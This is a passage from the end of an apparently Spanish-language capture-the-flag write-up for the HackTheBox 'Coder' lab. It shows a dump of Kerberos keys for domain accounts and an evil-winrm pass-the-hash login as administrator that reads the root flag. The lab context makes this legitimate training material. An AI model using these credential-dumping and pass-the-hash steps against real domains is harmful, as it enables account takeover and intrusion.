coder.htb\j.briggs:des-cbc-md5:7f5286d35def8f15
coder.htb\l.kang:aes256-cts-hmac-sha1-96:d7eb03d2695638c4ba423cd88e22dcdd7c0f6da996e5d6ed3af6c6d7e6c56661
coder.htb\l.kang:aes128-cts-hmac-sha1-96:25ad8331aa0fa2b26e220040b9e55937
coder.htb\l.kang:des-cbc-md5:571a573e61ced640
coder.htb\s.blade:aes256-cts-hmac-sha1-96:ceeab374597121113f3bdee3aab1fed0522506909b2f1ec24dfe36045eb3c252
coder.htb\s.blade:aes128-cts-hmac-sha1-96:69f4cada02748fba948e4c15460add9e
coder.htb\s.blade:des-cbc-md5:26eca8ad9deaada2
coder.htb\svc_teamcity:aes256-cts-hmac-sha1-96:b6c7ed72b4434a89c56295df6b42ca68937702dda15f90f23423e8712abce030
coder.htb\svc_teamcity:aes128-cts-hmac-sha1-96:d6604e2fadb40bbf71708e7b9c9734a7
coder.htb\svc_teamcity:des-cbc-md5:264ab5645ed91c86
DC01$:aes256-cts-hmac-sha1-96:a43b686fdd5f2e576ad834c5b1d4327dd5bdbd3ec579677343a2c6c43c8f1740
DC01$:aes128-cts-hmac-sha1-96:22192237a3cb399c19a6b469dcd1cba8
DC01$:des-cbc-md5:cb9758c162ba4943
0xdf_PC$:aes256-cts-hmac-sha1-96:3724ff7af15c732b0215094d07dbd75117160affa7c53e911f2bf92012a37b4f
0xdf_PC$:aes128-cts-hmac-sha1-96:a413f148fa50ed8e18a0a0eac55a2e48
0xdf_PC$:des-cbc-md5:98efb64c7c6e1f80
[*] Cleaning up...
```
### Shell

Con dicho hash me autentique en el dominio.

```powershell
evil-winrm -i coder.htb -u administrator -H '807726fcf9f188adc26eeafd7dc16bb7'

Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
84c976b649671916033bfe7a83e1423c
```

`~Happy Hacking.`